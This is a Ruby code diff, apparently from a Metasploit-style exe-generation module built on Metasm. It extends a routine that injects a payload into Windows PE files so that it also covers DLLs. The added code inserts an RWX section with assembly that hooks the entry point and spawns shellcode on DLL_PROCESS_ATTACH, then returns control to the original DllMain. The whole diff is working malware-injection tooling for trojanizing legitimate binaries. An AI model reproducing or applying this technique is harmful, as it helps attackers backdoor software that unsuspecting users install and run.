@@ -31,7 +31,6 @@ module Exe
 
     def create_thread_stub
       <<-EOS
-        hook_entrypoint:
         pushad
         push hook_libname
         call [iat_LoadLibraryA]
@@ -68,8 +67,9 @@ module Exe
       return asm
     end
 
-    def payload_stub
-      asm = create_thread_stub
+    def payload_stub(prefix)
+      asm = "hook_entrypoint:\n#{prefix}\n"
+      asm << create_thread_stub
       asm << payload_as_asm
       shellcode = Metasm::Shellcode.assemble(processor, asm)
       shellcode.encoded
@@ -85,14 +85,34 @@ module Exe
       pe.mz.encoded.export = pe_orig.encoded[0, 512].export.dup
       pe.header.time = pe_orig.header.time
 
+      prefix = ''
+      if pe.header.characteristics.include? "DLL"
+        # if there is no entry point, just return after we bail or spawn shellcode
+        if pe.optheader.entrypoint == 0
+          prefix = "cmp [esp + 8], 1
+              jz spawncode
+entrypoint:
+              xor eax, eax
+              inc eax
+              ret 0x0c
+              spawncode:"
+        else
+          # there is an entry point, we'll need to go to it after we bail or spawn shellcode
+          # if fdwReason != DLL_PROCESS_ATTACH, skip the shellcode, jump back to original DllMain
+          prefix = "cmp [esp + 8], 1
+              jnz entrypoint"
+        end
+      end
       # Generate a new code section set to RWX with our payload in it
       s = Metasm::PE::Section.new
       s.name = '.text'
-      s.encoded = payload_stub
+      s.encoded = payload_stub prefix
       s.characteristics = %w[MEM_READ MEM_WRITE MEM_EXECUTE]
 
       # Tell our section where the original entrypoint was
-      s.encoded.fixup!('entrypoint' => pe.optheader.image_base + pe.optheader.entrypoint)
+      if pe.optheader.entrypoint != 0
+        s.encoded.fixup!('entrypoint' => pe.optheader.image_base + pe.optheader.entrypoint)
+      end
       pe.sections << s
       pe.invalidate_header
 
